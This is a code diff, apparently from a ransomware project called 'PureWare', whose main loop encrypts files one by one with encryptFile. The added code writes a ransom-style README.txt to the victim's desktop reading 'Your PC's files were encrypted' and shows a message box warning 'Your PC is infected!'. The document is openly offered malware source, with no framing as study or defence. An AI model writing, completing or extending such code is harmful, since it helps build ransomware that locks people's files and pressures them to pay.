@@ -1,6 +1,5 @@
 ﻿#include "PureWare.hpp"
 
-using path_t = std::filesystem::path;
 using namespace std;
 auto file_logger = spdlog::basic_logger_mt("file_logger", "logs/my_log.txt");
 
@@ -28,6 +27,9 @@ int main(int argc, char* argv[])
             encryptFile(NextFile, key);
         }
     }
+
+    NoteModule warn_user;
+    warn_user.NotifyUsersAboutWorkResults();
 
     return 0;
 }
@@ -226,3 +228,57 @@ void FileModule::FindDirectory() {
     CoTaskMemFree(directoryPath); // need to free because SHGetKnownFolderPath allocates address and stores path in it
 
 }
+
+
+// NoteModule implementation starts here
+
+NoteModule::NoteModule() : Note_that_would_be_set_in_file(L"Your PC's files were encrypted.\n") {
+}
+
+NoteModule::NoteModule(std::wstring Note_that_would_be_set_in_file) : Note_that_would_be_set_in_file(Note_that_would_be_set_in_file) {
+}
+
+// This method notifies user about program.
+// Starts windows to attract attetnion and creates REAME file with needed explanations.
+void NoteModule::NotifyUsersAboutWorkResults() {
+    // Getting the path to the user's desktop
+    wchar_t desktopPath[MAX_PATH];
+    SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
+
+    // Creating the full path of the README.txt file
+    path_t README_file_path = path_t(desktopPath) / L"README.txt";
+    Create_README_file(README_file_path);
+
+    // Message Box that notifies user about encrypting files and asks to read README
+    int msgboxID = MessageBox(
+        NULL,
+        "Your PC is infected!\nCheck the README.txt file on your desktop.\nPush \"Yes\" button to open the file right now.",
+        "CHECK README!",
+        MB_ICONEXCLAMATION | MB_YESNO
+    );
+
+    // If msbox's "Yes" button was pushed - open README.
+    if (msgboxID == IDYES) {
+        ShellExecute(NULL, "open", README_file_path.string().c_str(), NULL, NULL, SW_SHOWNORMAL);
+    }
+}
+
+// Method that creates README file at Desktop
+void NoteModule::Create_README_file(const path_t& README_path) {
+    // Checking the file's existence and creating if not 
+    std::filesystem::create_directories(README_path.parent_path());
+
+    // Opening a file for writing
+    std::wofstream out(README_path);
+    if (!out) {
+        std::cerr << "Не удалось открыть файл для записи, по пути:" << README_path << std::endl;
+        return;
+    }
+
+    // Moving variable's content into a file
+    out << Note_that_would_be_set_in_file << std::endl;
+
+    // out is closed automatically due to the destructor
+}
+
+// NoteModule implementation ends here
